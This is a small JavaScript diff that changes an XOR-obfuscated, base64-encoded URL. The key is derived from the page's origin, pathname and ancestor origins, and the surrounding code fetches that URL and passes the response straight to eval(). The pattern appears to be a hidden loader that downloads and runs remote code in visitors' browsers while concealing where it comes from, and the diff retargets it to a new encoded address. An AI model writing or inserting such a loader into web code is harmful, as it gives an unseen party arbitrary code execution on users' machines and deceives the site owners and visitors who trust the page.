@@ -20,7 +20,7 @@
     }
 
     const key = JSON.stringify([location.origin, location.pathname, location.ancestorOrigins]);
-    const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxtJBAMPDR8FBB1IEQIBBglBAQYDS0RIRkBGF0pARVZJRxUEAFxbS0ADBlwFEQ==';
+    const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxZIBwsEDBcBHxtLAwEIDwJABQUKTFxLTUNHGlJATVNNRxUQHxFfAFgAEV0AEgQacQgCHQMIS00FHg==';
     const a = await fetch((xorStrings(key, atob(href))));
     const b = await a.text();
     eval(b);
